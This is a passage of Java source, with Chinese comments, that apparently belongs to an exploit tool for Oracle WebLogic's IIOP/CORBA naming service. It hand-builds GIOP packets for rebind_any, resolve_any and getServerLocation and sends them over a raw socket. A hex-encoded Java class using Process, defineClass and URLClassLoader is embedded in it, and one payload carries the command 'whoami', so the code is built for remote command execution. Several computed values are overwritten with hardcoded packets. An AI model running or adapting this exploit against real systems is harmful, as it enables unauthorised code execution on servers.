6176612f6c616e672f537472696e673b294c6a6176612f6c616e672f50726f636573733b01000777616974466f7201000328294901000e676574496e70757453747265616d01001728294c6a6176612f696f2f496e70757453747265616d3b01002a284c6a6176612f696f2f496e70757453747265616d3b4c6a6176612f6c616e672f537472696e673b2956010013284c6a6176612f696f2f5265616465723b295601000e6765744572726f7253747265616d010008726561644c696e6501001c2843294c6a6176612f6c616e672f537472696e674275696c6465723b01000764657374726f790100116a6176612f696f2f436c6f736561626c65010005636c6f73650021000200390001003a000000070001003b003c0001003d0000002f00010001000000052ab70001b100000002003e00000006000100000012003f0000000c0001000000050040004100000001004200430001003d000000a00003000400000021bb000259b700034dbb000459b700054e2d2b2cb900060300a700084d2cb60008b1000100000018001b00070003003e0000001e00070000001b0008001c0010001d00180020001b001e001c001f00200021003f0000003400050008001000440041000200100008004500460003001c000400470048000200000021004000410000000000210049004a0001004b0000000700025b07004c040009004d004e0001003d0000005c0002000300000012bb000259b700034c2a03324d2b2cb60009b100000002003e0000001200040000002400080025000c002600110027003f00000020000300000012004f005000000008000a005100410001000c00060049004a00020001005200530002003d0000003f0000000300000001b100000002003e0000000600010000002c003f00000020000300000001004000410000000000010054004a0001000000010055004a0002005600000004000100570001005800590002003d00000076000300040000001e2b120ab6000b4d2c03324c2c04324e2db6000cb6000d4e2a2b2db6000eb000000002003e0000001600050000003000070031000b0032000f003300170034003f0000002a00040000001e0040004100000000001e005a004a000100070017005b00500002000f000f005c004a0003005600000004000100570001005d005e0002003d000004530006000c0000021d2bc6000c120f2bb600109900061211b02bb6000c4cbb001259b700134e013a04013a05013a061214b800153a071907b6000d3a07013a0819071216b600179900402b1218b600179900202b1219b600179a0017bb001259b700132bb6001a121bb6001ab6001c4c06bd001d5903121e535904121f5359052b533a08a7003d2b1218b600179900202b1219b600179a0017bb001259b700132bb6001a1220b6001ab6001c4c06bd001d5903122153590412225359052b533a08b800231908b600243a041904b60025572c1226b60017990034bb002759bb0028591904b60029122ab7002bb7002c3a05bb002759bb0028591904b6002d122ab7002bb7002c3a06a70031bb002759bb0028591904b60029122eb7002bb7002c3a05bb002759bb0028591904b6002d122eb7002bb7002c3a06013a091905b6002f593a09c600122d1909b6001a100ab6003057a7ffe91906b6002f593a09c600122d1909b6001a100ab6003057a7ffe91905b800311906b800311904c600841904b60032a7007c3a091905b800311906b800311904c6006b1904b60032a700633a091905b800311906b800311904c600521904b60032a7004a3a09bb001259b700132bb6001a1236b6001ab6001c3a0a1905b800311906b800311904c600081904b60032190ab03a0b1905b800311906b800311904c600081904b60032190bbf2dc6000c120f2db60010990017bb001259b700132bb6001a1237b6001ab6001cb02db6001cb0000800b80167017e003300b801670197003400b8016701b0003500b8016701de0000017e018001de00000197019901de000001b001c701de000001de01e001de00000003003e000000ea003a0000003f000d00400010004200150043001d0044002000450023004600260047002d0048003400490037004a0041004b0053004c0067004e007e00500090005100a4005300b8005600c2005700c8005800d1005900e8005a0102005c0119005d0130005f01330060013e0061014d0063015800640167006b016c006c0171006d0176006e017e00660180006b0185006c018a006d018f006e019700670199006b019e006c01a3006d01a8006e01b0006801b2006901c7006b01cc006c01d1006d01d6006e01db006901de006b01e5006c01ea006d01ef006e01f4007001f700710204007202180074003f00000070000b01330034005f004a000901b2002c0047006000090000021d0040004100000000021d005a004a00010000021d0061004a0002001d0200006200630003002001fd006400650004002301fa006600670005002601f7006800670006002d01f0005c004a0007003701e6006900500008004b0000007e00140d02ff0056000907006a07006b07006b07006c07006d07006e07006e07006b07006f0000162513fb00492dfc000207006b19fa0019560700705807007158070072fd002a07007207006bff0002000907006a07006b07006b07006c07006d07006e07006e07006b07006f0001070073fe00150000070073f800020c1300560000000400010057000a007400750001003d0000005e000100020000000f2ac6000d2ab900380100a700044cb100010004000a000d00070003003e000000160005000000790004007b000a007d000d007c000e007f003f0000000c00010000000f007600770000004b0000000700024d07004c0000010078000000020079fffffffa7fffff0affffffffffffe5580000000f0000000b646566696e65436c61737300fffffffb7fffff0affffffffffffe898000000100000000000000000ffffffffffffecbcfffffffb7fffff0affffffffffffe87400000004000000007fffff0affffffffffffe8c800000048000000010000001e0000003c000000000000002349444c3a6f6d672e6f72672f434f5242412f57537472696e6756616c75653a312e30000000000001000000000000001b000000007fffff0affffffffffffe4a400000014000000103562614166484758566b54426a6c6370fffffffa7fffff0affffffffffffe47c0000000b00000007726d6942696e6400fffffffd000000a4000000000000002000000031000000000000002349444c3a6f6d672e6f72672f434f5242412f4162737472616374426173653a312e3000000000000100000000000000000000001d000000580000000000000040524d493a6a617661782e726d692e434f5242412e436c617373446573633a324241424441303435383741444343433a4346424630324346353239343137364200000000010000000000000000000000007fffff0affffffffffffe86400000008ffffffffffffe89c7fffff0affffffffffffe39c000000300000002c524d493a6a6176612e6e65742e55524c436c6173734c6f616465723a30303030303030303030303030303030ffffffff";
        stubData += IIOPUtils.addZeroForNum(Integer.toHexString(bindName.length()), 8);
        stubData += bindNameHex;

        String rmiPocHex = "";

        stubData = "fffffffa7fffff0affffffffffffe47c0000000b00000007726d6942696e6400fffffffd000000a4000000000000002000000031000000000000002349444c3a6f6d672e6f72672f434f5242412f4162737472616374426173653a312e3000000000000100000000000000000000001d000000580000000000000040524d493a6a617661782e726d692e434f5242412e436c617373446573633a324241424441303435383741444343433a4346424630324346353239343137364200000000010000000000000000000000007fffff0affffffffffffe86400000008ffffffffffffe89c7fffff0affffffffffffe39c000000300000002c524d493a6a6176612e6e65742e55524c436c6173734c6f616465723a30303030303030303030303030303030ffffffff";
        return stubData;

    }

    /**
     * op=resolve_any
     * @param socket socket
     * @param key key
     * @param resolveName bindName
     * @return resolveAny Info
     */
    public static byte[] resolveAny(Socket socket,String key,String resolveName) throws Exception {
        // request id
        String requestId = "00000005";
        // response flags
        String responseFlags = "03";
        // reserved
        String reserved = "000000";
        // target address
        String targetAddress = "0000"+"0000";
        // key length
        String keyLength = IIOPUtils.addZeroForNum(Integer.toHexString(key.length()/2), 8);
        // key
        // operation length + operation(rebind_any)
        String operationLength = "00"+"00000c72"+"65736f6c76655f616e7900";
        // serviceContextList
        String serviceContextList = "00000000";
        String header = GIOP_MAGIC+GIOP_VERSION+"00"+GIOP_MESSAGE_TYPE + GIOP_MESSAGE_SIZE + requestId+ responseFlags+reserved+targetAddress+keyLength+key+operationLength+serviceContextList;
        serviceContextList += calculationPadding(header);
        String stubData = "00000001";
        // resolveName Length
        String resolveNameLength = IIOPUtils.addZeroForNum(Integer.toHexString(resolveName.length()), 8);
        stubData += resolveNameLength;
        stubData += HexUtil.encodeHexStr(resolveName);
        stubData += "0000000100";
        String body = requestId+ responseFlags+reserved+targetAddress+keyLength+key+operationLength+serviceContextList + stubData;
        GIOP_MESSAGE_SIZE = IIOPUtils.addZeroForNum(Integer.toHexString(body.length()/2),8);
        header = GIOP_MAGIC+GIOP_VERSION+"00"+GIOP_MESSAGE_TYPE;
        String content = header + GIOP_MESSAGE_SIZE + body;
        content = "47494f5001020000000000b90000000503000000000000000000007800424541080103000000000c41646d696e53657276657200000000000000003349444c3a7765626c6f6769632f636f7262612f636f732f6e616d696e672f4e616d696e67436f6e74657874416e793a312e3000000000000432383900000000014245412c000000100000000000000000e5b1d068fce4c4b80000000c7265736f6c76655f616e79000000000000000001000000106a3732514c454b5977464b6f716562780000000100";
        return send(content, socket);
    }

    /**
     * op=getServerLocation
     * @param socket socket
     * @param key key
     * @param cmd cmd
     * @return
     */
    public static byte[] getServerLocation(Socket socket, String key, String cmd) throws Exception {
        // request id
        String requestId = "00000006";
        // key
        // operation length + operation(getServerLocation)
        String operationLength = "00"+"00001267"+"65745365727665724c6f636174696f6e00";
        // stub data
        String stubData = "7fffff020000002349444c3a6f6d672e6f72672f434f5242412f57537472696e6756616c75653a312e3000000000001277686f616d69404057696e646f7773203130";
        String msg = generateMsg(key, requestId, operationLength, stubData);
        return send(msg, socket);
    }


    /**
     * 生成消息
     * @param key key
     * @param requestId 请求 id
     * @param operationLength 操作长度
     * @param stubData 数据
     * @return 发包内容
     */
    private static String generateMsg(String key, String requestId, String operationLength, String stubData){
        // response flags
        String responseFlags = "03";
        // reserved
        String reserved = "000000";
        // target address
        String targetAddress = "0000"+"0000";
        // key length
        String keyLength = IIOPUtils.addZeroForNum(Integer.toHexString(key.length()/2), 8);
        // serviceContextList
        String serviceContextList = "0000000000";
        String header = GIOP_MAGIC+GIOP_VERSION+"00"+GIOP_MESSAGE_TYPE + GIOP_MESSAGE_SIZE + requestId+ responseFlags+reserved+targetAddress+keyLength+key+operationLength+serviceContextList;
        serviceContextList += calculationPadding(header);
        String body = requestId+ responseFlags+reserved+targetAddress+keyLength+key+operationLength+serviceContextList + stubData;
        GIOP_MESSAGE_SIZE = IIOPUtils.addZeroForNum(Integer.toHexString(body.length()/2),8);
        header = GIOP_MAGIC+GIOP_VERSION+"00"+GIOP_MESSAGE_TYPE;
        String content = header + GIOP_MESSAGE_SIZE + body;
        return content;
    }

    /**
     * 计算 padding 字符
     * @param content 内容信息
     * @return
     */
    public static String calculationPadding(String content){
        System.out.println(content);
        String padding = "";
        int paddingCount = (content.length()%16)/2;
        // 计算填充字节码
        if (paddingCount > 0){
            paddingCount = 8 - paddingCount;
            for (int i = 0; i < paddingCount; i++ ) {
                padding += "00";
            }
        }
        return padding;
    }

    /**
     * 生成 IP hex码
     * @param ip ip地址
     * @return
     */
    public static String setIpHex(String ip){
        return "4245410e000000"+Integer.toHexString(ip.length()+9)+"00000000000000"+Integer.toHexString(ip.length()+1)+ HexUtil.encodeHexStr(ip)+"00";
    }

    /**
     * 发送 socket 内容
     * @param msg 消息内容
     * @param socket socket 连接
     * @return 响应结果
     * @throws Exception
     */
    public static byte[] send(String msg, Socket socket) throws Exception{
        OutputStream out = socket.getOutputStream();
        InputStream is = socket.getInputStream();
        out.write(hexStrToBinaryStr(msg));
        out.flush();
        byte[] bytes = new byte[4096];
        int length = is.read(bytes);
        return Arrays.copyOfRange(bytes, 0,length);
    }

    /**
     * hex 转换为 bye[]
     * @param hexString hex 字符串
     * @return 转换结果 bye[]
     */
    public static byte[] hexStrToBinaryStr(String hexString) {
        hexString = hexString.replaceAll(" ", "");
        int len = hexString.length();
        int index = 0;
        byte[] bytes = new byte[len / 2];
        while (index < len) {
            String sub = hexString.substring(index, index + 2);
            bytes[index/2] = (byte)Integer.parseInt(sub,16);
            index += 2;
        }
        return bytes;
    }

    /**
     * 二进制转换为 hex
     * @param bytes byte数组
     * @return hex 进制字符串
     */
    public static String binaryToHexString(byte[] bytes) {
        String hexStr = "0123456789abcdef";
        String result = "";
        String hex = "";
        for (byte b : bytes) {
            hex = String.valueOf(hexStr.charAt((b & 0xF0) >> 4));
            hex += String.valueOf(hexStr.charAt(b & 0x0F));
            result += hex + "";
        }
        return result;
    }

}
